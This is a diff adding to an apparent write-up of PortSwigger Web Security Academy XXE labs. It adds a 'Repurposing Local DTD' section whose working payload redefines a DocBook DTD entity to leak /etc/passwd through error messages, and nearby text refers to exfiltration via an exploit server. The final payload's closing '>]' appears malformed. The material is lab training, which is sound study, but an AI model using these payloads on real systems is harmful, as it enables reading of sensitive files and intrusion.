@@ -138,7 +138,7 @@ I want to extract the data from `/etc/hostname`, and then send that to Collabora
 %exfil;
 ```
 
-`&#x25` represents a `%` in Unicode, and it is used because of syntaxing. After storing this on the exploit server, I used this payload to make the application retrieve it and process it.
+`&#x25` represents a `%` in Unicode, and it is used to prevent syntax errors. After storing this on the exploit server, I used this payload to make the application retrieve it and process it.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -251,4 +251,40 @@ match = re.findall(r'/post/comment/avatars\?filename=(\d.png)', r.text)
 if match:
     for i in match:
         print(f'[+] Visit https://{HOST}.web-security-academy.net/post/comment/avatars?filename={i} to get answer')
+```
+
+## Lab 9: Repurposing Local DTD
+
+This lab requires us to use the `/usr/share/yelp/dtd/docbookx.dtd` to exploit it, and within that particular DTD is an entity called `ISOamso`.
+
+To solve the lab, firstly, we have to reference the local DTD, and I used a parameter entity: 
+
+```xml
+<!DOCTYPE exploit [
+<!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+]>
+```
+
+Next, I have to redefine the `ISOamso` entity, and I took the payload from PayloadAllTheThings:
+
+```xml
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;'>
+```
+
+So the final payload is:
+
+```xml
+<!DOCTYPE exploit [
+<!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;'>
+%local;
+>]
 ```
